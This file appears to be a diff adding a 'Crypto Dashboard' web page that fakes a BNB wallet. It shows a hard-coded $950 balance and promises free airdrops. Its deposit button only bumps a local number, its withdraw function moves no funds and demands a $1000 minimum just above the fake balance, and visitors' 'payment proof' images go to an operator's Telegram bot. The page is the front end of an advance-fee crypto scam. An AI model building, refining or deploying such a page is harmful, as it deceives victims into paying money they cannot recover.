@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crypto Dashboard</title>
+  <style>
+    * {margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif;}
+    body {background: #0f0f1b; color: #fff; min-height: 100vh; padding-bottom: 80px;}
+    .content-section {display: none; padding: 30px 20px; text-align: center;}
+    .content-section.active {display: block;}
+    .content-box {
+      background: #11152a;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0,255,255,0.15);
+      border: 1px solid #1f2235;
+      margin-top: 30px;
+    }
+    .content-box h2 {color: #00ffff; margin-bottom: 15px;}
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background: #11152a;
+      display: flex;
+      justify-content: space-around;
+      border-top: 1px solid #1f2235;
+      z-index: 100;
+    }
+    .nav-item {
+      flex: 1;
+      padding: 12px 5px;
+      text-align: center;
+      color: #aaa;
+      font-size: 18px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .nav-item.active {color: #00ffff; transform: translateY(-5px);}
+    .nav-item span {display: block; font-size: 22px;}
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 6px;
+      border: none;
+      background: #0e162e;
+      color: #00ffff;
+    }
+    .btn {
+      padding: 12px 20px;
+      background: linear-gradient(90deg,#00c6ff,#0072ff);
+      border: none;
+      color: #fff;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    #bnbPrice {color: #00ff90; font-weight: bold; font-size: 18px; margin-top: 10px;}
+    .tx-log {
+      margin-top: 15px;
+      font-size: 15px;
+      color: #ccc;
+      text-align: left;
+      padding-left: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<!-- ✅ Home Section with all original boxes -->
+<div id="home" class="content-section active">
+  <div class="content-box">
+    <h2>💼 Wallet</h2>
+    <p>Your current balance:</p>
+    <div style="font-size: 24px; margin-top: 10px;">
+      <strong class="walletAmount">$950</strong> (<span id="bnbValue">--</span> BNB)
+    </div>
+  </div>
+
+  <div class="content-box">
+    <h2>📊 BNB Price</h2>
+    <div id="bnbPrice">Loading BNB price...</div>
+  </div>
+
+  <div class="content-box">
+    <h2>📢 Latest Update</h2>
+    <p>We just launched a new feature for faster withdrawals!</p>
+  </div>
+
+  <div class="content-box" style="background: linear-gradient(135deg, #122c42, #0d1d2e); border: 1px solid #1a4f72;">
+    <h2 style="color: #00e6e6;">💎 Airdrop</h2>
+    <p style="color: #cceeff;">Earn free BNB daily through our airdrop rewards.</p>
+  </div>
+
+  <div class="content-box" style="background: linear-gradient(135deg, #2c132c, #1a0d1a); border: 1px solid #84216b;">
+    <h2 style="color: #ff66cc;">🧠 Tasks</h2>
+    <p style="color: #ffd6f5;">Complete daily challenges to earn bonus BNB.</p>
+  </div>
+</div>
+
+<!-- ✅ Wallet / Earn placeholder -->
+<div id="wallet" class="content-section">
+  <div class="content-box">
+    <h2>💰 Earn</h2>
+    <p style="color:#d7ffee;">Coming soon...</p>
+  </div>
+</div>
+
+<!-- ✅ Deposit Section -->
+<div id="deposit" class="content-section">
+  <div class="content-box">
+    <h2>➕ Deposit</h2>
+    <input type="number" id="depositAmount" class="input-field" placeholder="Enter amount in USD" />
+    <button class="btn" onclick="handleDeposit()">Deposit</button>
+    <div class="tx-log" id="depositLog"></div>
+
+    <p style="margin-top: 20px;">Optional: upload payment proof</p>
+    <input type="file" accept="image/*" id="paymentProof" class="input-field" />
+    <button class="btn" style="margin-top:10px;" onclick="sendToTelegram()">Send Proof</button>
+    <p id="uploadMsg" style="margin-top:10px;"></p>
+  </div>
+</div>
+
+<!-- ✅ Withdraw Section with BNB address input -->
+<div id="withdraw" class="content-section">
+  <div class="content-box">
+    <h2>➖ Withdraw</h2>
+    <input type="text" id="withdrawAddress" class="input-field" placeholder="Enter your BNB withdrawal address" />
+    <input type="number" id="withdrawAmount" class="input-field" placeholder="Enter BNB amount" />
+    <button class="btn" onclick="withdrawBNB()">Withdraw</button>
+    <div class="tx-log" id="withdrawLog"></div>
+  </div>
+</div>
+
+<!-- ✅ Transactions Section -->
+<div id="transactions" class="content-section">
+  <div class="content-box">
+    <h2>📜 Transactions</h2>
+    <div id="txHistory"></div>
+  </div>
+</div>
+
+<!-- ✅ Bottom Navigation -->
+<div class="bottom-nav">
+  <div class="nav-item active" onclick="showSection('home', this)"><span>🏠</span>Home</div>
+  <div class="nav-item" onclick="showSection('wallet', this)"><span>💼</span>Earn</div>
+  <div class="nav-item" onclick="showSection('deposit', this)"><span>➕</span>Deposit</div>
+  <div class="nav-item" onclick="showSection('withdraw', this)"><span>➖</span>Withdraw</div>
+  <div class="nav-item" onclick="showSection('transactions', this)"><span>📜</span>History</div>
+</div>
+
+<script>
+  const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN";
+  const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
+
+  let bnbPriceUSD = 600;
+  let currentBalanceUSD = 950;
+
+  function updateBNBValue() {
+    const bnb = (currentBalanceUSD / bnbPriceUSD).toFixed(4);
+    document.getElementById("bnbValue").textContent = bnb;
+    document.querySelectorAll(".walletAmount").forEach(el => el.textContent = `$${currentBalanceUSD.toFixed(2)}`);
+  }
+
+  function showSection(id, el) {
+    document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
+    el.classList.add('active');
+  }
+
+  function handleDeposit() {
+    const val = parseFloat(document.getElementById("depositAmount").value);
+    const logBox = document.getElementById("depositLog");
+    if (!val || val <= 0) {
+      logBox.textContent = "⚠️ Enter a valid amount to deposit.";
+      return;
+    }
+
+    currentBalanceUSD += val;
+    updateBNBValue();
+
+    const log = `✅ Deposited $${val.toFixed(2)}`;
+    logBox.textContent = log;
+    addToHistory(log);
+    document.getElementById("depositAmount").value = '';
+  }
+
+  function withdrawBNB() {
+    const address = document.getElementById("withdrawAddress").value.trim();
+    const bnbAmount = parseFloat(document.getElementById("withdrawAmount").value);
+    const logBox = document.getElementById("withdrawLog");
+
+    if (!address) {
+      logBox.textContent = "⚠️ Please enter your BNB withdrawal address.";
+      return;
+    }
+
+    if (!bnbAmount || bnbAmount <= 0) {
+      logBox.textContent = "⚠️ Enter a valid BNB amount to withdraw.";
+      return;
+    }
+
+    const usd = bnbAmount * bnbPriceUSD;
+
+    if (currentBalanceUSD < 1000) {
+      logBox.textContent = "❌ You must have at least $1000 to withdraw.";
+      return;
+    }
+    if (usd > currentBalanceUSD) {
+      logBox.textContent = "❌ Insufficient balance.";
+      return;
+    }
+
+    currentBalanceUSD -= usd;
+    updateBNBValue();
+
+    const log = `✅ Withdrew ${bnbAmount} BNB ($${usd.toFixed(2)}) to address: ${address}`;
+    logBox.textContent = log;
+    addToHistory(log);
+    document.getElementById("withdrawAmount").value = '';
+    document.getElementById("withdrawAddress").value = '';
+  }
+
+  function addToHistory(text) {
+    const div = document.createElement("div");
+    div.textContent = text;
+    document.getElementById("txHistory").prepend(div);
+  }
+
+  function sendToTelegram() {
+    const fileInput = document.getElementById('paymentProof');
+    const messageBox = document.getElementById('uploadMsg');
+    if (!fileInput.files.length) {
+      messageBox.textContent = '⚠️ Please select an image.';
+      messageBox.style.color = 'orange';
+      return;
+    }
+
+    const file = fileInput.files[0];
+    const formData = new FormData();
+    formData.append("chat_id", TELEGRAM_CHAT_ID);
+    formData.append("caption", "💸 Payment Proof Uploaded");
+    formData.append("photo", file);
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    }).then(res => {
+      if (res.ok) {
+        messageBox.textContent = "✅ Proof sent!";
+        messageBox.style.color = "lightgreen";
+        fileInput.value = '';
+      } else {
+        messageBox.textContent = "❌ Failed to send.";
+        messageBox.style.color = "red";
+      }
+    }).catch(() => {
+      messageBox.textContent = "⚠️ Network error.";
+      messageBox.style.color = "red";
+    });
+  }
+
+  // Fetch live BNB price from CoinGecko API
+  fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")
+    .then(res => res.json())
+    .then(data => {
+      bnbPriceUSD = data.binancecoin.usd;
+      document.getElementById("bnbPrice").textContent = `BNB Price: $${bnbPriceUSD}`;
+      updateBNBValue();
+    }).catch(() => {
+      document.getElementById("bnbPrice").textContent = `BNB Price: $${bnbPriceUSD} (offline)`;
+      updateBNBValue();
+    });
+
+</script>
+
+</body>
+</html>
